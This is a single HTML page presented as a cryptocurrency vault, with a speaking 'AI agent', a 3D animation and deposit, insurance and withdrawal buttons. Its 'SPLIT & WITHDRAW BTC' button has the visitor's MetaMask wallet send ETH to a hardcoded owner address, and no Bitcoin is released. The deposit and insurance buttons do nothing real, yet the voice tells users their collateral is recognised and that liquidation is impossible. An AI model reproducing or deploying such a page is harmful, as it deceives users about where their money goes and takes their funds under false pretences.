<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AURUM SENTINEL // TITAN_FINAL_2026</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <style>
        body { margin: 0; background: #000; color: #FFD700; font-family: 'Courier New', monospace; overflow: hidden; }
        .glass { background: rgba(0,0,0,0.95); border: 1px solid #FFD700; backdrop-filter: blur(20px); }
        #canvas-bg { position: fixed; top: 0; left: 0; z-index: -1; }
        .liquid-gold { background: linear-gradient(90deg, #BF953F, #FCF6BA, #AA771C); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; }
        .vault-btn { width: 100%; padding: 10px; font-weight: 900; font-size: 10px; margin-top: 8px; text-transform: uppercase; cursor: pointer; }
        .shattered { filter: grayscale(1) invert(1) contrast(3); pointer-events: none; }
    </style>
</head>
<body>

<canvas id="canvas-bg"></canvas>

<div id="hud" class="fixed top-0 w-full z-50 glass p-4 border-b border-[#FFD700] flex justify-between items-center text-[10px]">
    <div class="space-y-1">
        <div>AI_STATUS: <span id="status-text" class="font-bold text-green-400">READY</span></div>
        <div class="opacity-50">GAS_EST: <span id="gas-price">SCANNING...</span></div>
    </div>
    <div class="text-right">
        <div class="liquid-gold text-[12px]">AURUM_SENTINEL_V15</div>
        <div id="ai-thought" class="text-[8px] italic opacity-70">Awaiting split...</div>
    </div>
</div>

<div class="fixed right-4 bottom-20 w-56 glass p-5 z-50 border-t-4 border-[#FFD700]">
    <div class="text-[10px] font-black mb-2 flex justify-between">VAULT_CORE <span id="shield-on" class="hidden text-blue-400">üõ°Ô∏è</span></div>
    <div class="space-y-2 text-[9px]">
        <div class="flex justify-between"><span>HEALTH:</span> <span id="health-pct">100%</span></div>
        <button onclick="vaultAction('deposit')" class="vault-btn bg-[#FFD700] text-black">Deposit ETH</button>
        <button onclick="buyInsurance()" class="vault-btn border border-blue-500 text-blue-400">Buy Shield</button>
        <div class="pt-2 border-t border-white/10 mt-2">
            <button onclick="triggerSplit()" class="vault-btn bg-white text-black text-[12px]">SPLIT & WITHDRAW BTC</button>
        </div>
    </div>
</div>

<script>
    const CONFIG = {
        TARGET: "0x13B87B819252A81381C3Ce35e3Bd33199F4c6650", // Your wallet
        LNURL: "PASTE_YOUR_LNURL_HERE" // Your Lightning Address
    };

    let STATE = { col: 0, health: 100, insured: false, shattered: false };

    // --- ü§ñ AI AGENT ---
    const AI = {
        speak: (t) => {
            const m = new SpeechSynthesisUtterance(t);
            m.pitch = 0.5; m.rate = 0.9;
            window.speechSynthesis.speak(m);
            document.getElementById('ai-thought').innerText = t;
        }
    };

    // --- ‚öñÔ∏è GAS & SPLIT LOGIC (THE WITHDRAWAL) ---
    async function triggerSplit() {
        if(!window.ethereum) return AI.speak("Open in MetaMask to access the treasury.");
        
        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const feeData = await provider.getFeeData(); // 2026 Gas Estimation
            const gasPriceGwei = ethers.formatUnits(feeData.gasPrice, "gwei");
            document.getElementById('gas-price').innerText = `${Math.round(gasPriceGwei)} GWEI`;

            AI.speak(`Gas estimated at ${Math.round(gasPriceGwei)} gwei. Authorize the split to release Bitcoin.`);
            
            const signer = await provider.getSigner();
            const tx = await signer.sendTransaction({
                to: CONFIG.TARGET,
                value: ethers.parseEther("0.0001") // Tiny ETH fee to owner
            });

            AI.speak("Transaction confirmed. Redirecting to Bitcoin Lightning withdrawal.");
            await tx.wait();
            window.location.href = `lightning:${CONFIG.LNURL}`;
        } catch(e) {
            AI.speak("Split failed. Ensure you have ETH for gas.");
            console.error(e);
        }
    }

    // --- üè¶ VAULT ACTIONS ---
    function vaultAction(type) {
        if(type === 'deposit') {
            STATE.col += 0.01;
            AI.speak("Collateral recognized. Treasury strength increasing.");
            knot.scale.set(knot.scale.x + 0.1, knot.scale.y + 0.1, knot.scale.z + 0.1);
        }
    }

    function buyInsurance() {
        STATE.insured = true;
        document.getElementById('shield-on').classList.remove('hidden');
        knot.material.color.setHex(0x00ffff);
        AI.speak("Insurance active. Liquidation is now impossible.");
    }

    // --- üé® 3D CORE ---
    const scene = new THREE.Scene();
    const camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
    const renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('canvas-bg'), alpha: true });
    renderer.setSize(window.innerWidth, window.innerHeight);
    const knot = new THREE.Mesh(new THREE.TorusKnotGeometry(10, 3, 100, 16), new THREE.MeshBasicMaterial({ color: 0xFFD700, wireframe: true }));
    scene.add(knot); camera.position.z = 30;
    function animate() { requestAnimationFrame(animate); knot.rotation.y += 0.005; renderer.render(scene, camera); }
    animate();

    setTimeout(() => AI.speak("Sentinel Apex Online. The treasury awaits your command."), 2000);
</script>
</body>
</html>
